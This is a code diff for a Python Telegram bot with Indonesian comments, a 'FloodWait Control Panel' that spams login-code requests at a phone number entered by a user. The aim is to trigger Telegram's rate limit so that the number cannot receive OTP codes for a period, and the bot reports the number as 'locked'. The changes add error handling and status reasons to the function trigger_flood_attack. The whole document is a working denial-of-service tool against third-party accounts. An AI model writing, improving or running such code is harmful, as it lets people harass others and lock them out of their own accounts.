@@ -7,21 +7,28 @@ from datetime import datetime, timedelta
 from pathlib import Path
 
 from telethon import TelegramClient
-from telethon.errors import FloodWaitError
+from telethon.errors import (
+    FloodWaitError, 
+    PhoneNumberFloodError, 
+    PhoneNumberInvalidError, 
+    ApiIdInvalidError
+)
 from telethon.sessions import StringSession
 
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.constants import ParseMode
 from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters
 
-# Konfigurasi
+# Konfigurasi Logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# State Global
 CONFIG = {}
 ACTIVE_FLOODS = {} # Format: {"+628123456": timestamp_until}
 FLOOD_ATTACK_MAX_ATTEMPTS = 15
 FLOOD_ATTACK_DELAY_SECONDS = 2.0
+
 PHONE_REGEX = re.compile(r"^\+\d{7,15}$")
 
 def load_config():
@@ -61,6 +68,7 @@ def is_authorized(user_id: int) -> bool:
     return user_id in CONFIG.get("admin_ids", [])
 
 async def trigger_flood_attack(phone: str) -> tuple:
+    """Return (seconds, attempts, success, reason)"""
     client = TelegramClient(StringSession(), CONFIG["api_id"], CONFIG["api_hash"])
     attempts = 0
     try:
@@ -70,16 +78,29 @@ async def trigger_flood_attack(phone: str) -> tuple:
                 await client.send_code_request(phone)
                 attempts += 1
             except FloodWaitError as e:
+                # SUKSES: Telegram membalas FLOOD_WAIT_X
                 ACTIVE_FLOODS[phone] = time.monotonic() + e.seconds
-                return e.seconds, attempts, True
+                return e.seconds, attempts, True, "Berhasil memicu FloodWait"
+                
+            except PhoneNumberFloodError:
+                # SUKSES (Sudah terkunci sebelumnya): Nomor sudah dalam masa FloodWait
+                ACTIVE_FLOODS[phone] = time.monotonic() + 3600 # Default 1 jam
+                return 3600, attempts, True, "Nomor sudah dalam status FloodWait dari Telegram"
+                
+            except PhoneNumberInvalidError:
+                return 0, attempts, False, "Nomor tidak valid atau tidak terdaftar di Telegram."
+                
+            except ApiIdInvalidError:
+                return 0, attempts, False, "API ID / API Hash salah atau diblokir Telegram."
+                
             except Exception as e:
-                logger.error(f"Error flood: {e}")
-                return 0, attempts, False
+                logger.error(f"Error percobaan ke-{attempts}: {e}")
+                return 0, attempts, False, f"Error: {str(e)}"
             
             await asyncio.sleep(FLOOD_ATTACK_DELAY_SECONDS)
     finally:
         await client.disconnect()
-    return 0, attempts, False
+    return 0, attempts, False, "Batas maksimal percobaan habis tanpa respon FloodWait."
 
 # ================= UI & MENUS =================
 
@@ -95,6 +116,7 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ Unauthorized")
         return
 
+    context.user_data['awaiting_phone'] = False
     text = "🛡️ **FloodWait Control Panel**\n\nSilakan pilih menu di bawah ini:"
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_main_menu())
 
@@ -110,15 +132,14 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     data = query.data
 
-    # 1. Tombol Menu Utama
     if data == "main_menu":
+        context.user_data['awaiting_phone'] = False
         await query.edit_message_text(
             "🛡️ **FloodWait Control Panel**\n\nSilakan pilih menu di bawah ini:",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=get_main_menu()
         )
 
-    # 2. Tombol "Mulai FloodWait" (Minta Input Nomor)
     elif data == "menu_flood":
         context.user_data['awaiting_phone'] = True
         await query.edit_message_text(
@@ -128,8 +149,8 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
 
-    # 3. Tombol "Cek Status"
     elif data == "menu_status":
+        context.user_data['awaiting_phone'] = False
         lines = ["⏳ **Nomor dalam FloodWait**\n"]
         any_flood = False
         for phone in list(ACTIVE_FLOODS.keys()):
@@ -148,7 +169,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
 
-    # 4. Tombol Konfirmasi "Ya, Lock Nomor"
     elif data.startswith("confirm_flood_"):
         phone = data.replace("confirm_flood_", "")
         await query.answer("Memulai proses...")
@@ -159,7 +179,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
 
-        seconds, attempts, success = await trigger_flood_attack(phone)
+        seconds, attempts, success, reason = await trigger_flood_attack(phone)
 
         if success:
             until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
@@ -167,20 +187,21 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"✅ **Nomor Berhasil Dikunci**\n\n"
                 f"Nomor: `{phone}`\n"
                 f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
-                f"Percobaan: {attempts}x\n\n"
+                f"Percobaan: {attempts}x\n"
+                f"Status: _{reason}_\n\n"
                 f"🛡️ Tidak ada OTP yang bisa dikirim ke nomor ini selama periode tersebut."
             )
         else:
             text = (
                 f"⚠️ **Proses Tidak Berhasil**\n\n"
                 f"Nomor: `{phone}`\n"
-                f"Telegram menerima {attempts} request tanpa memberi FloodWait."
+                f"Percobaan: {attempts}x\n"
+                f"Alasan: **{reason}**"
             )
 
         keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
         await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
 
-    # 5. Tombol Batal
     elif data == "cancel_flood":
         context.user_data['awaiting_phone'] = False
         await query.answer("Dibatalkan")
@@ -192,7 +213,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ================= MESSAGE HANDLER (INPUT NOMOR) =================
 
 async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Hanya proses jika bot sedang menunggu input nomor dari user ini
     if not context.user_data.get('awaiting_phone'):
         return
 
@@ -202,7 +222,6 @@ async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     raw_phone = update.message.text.strip()
     phone = normalize_phone(raw_phone)
 
-    # Validasi Format
     if not PHONE_REGEX.match(phone):
         await update.message.reply_text(
             f"❌ Format salah: `{raw_phone}`\n"
@@ -221,7 +240,6 @@ async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
         context.user_data['awaiting_phone'] = False
         return
 
-    # Tampilkan Konfirmasi via Callback
     context.user_data['awaiting_phone'] = False
     
     keyboard = [
@@ -248,7 +266,6 @@ def main():
     logger.info("Memulai FloodWait Bot...")
     app = Application.builder().token(CONFIG["bot_token"]).build()
 
-    # Handlers
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_input))
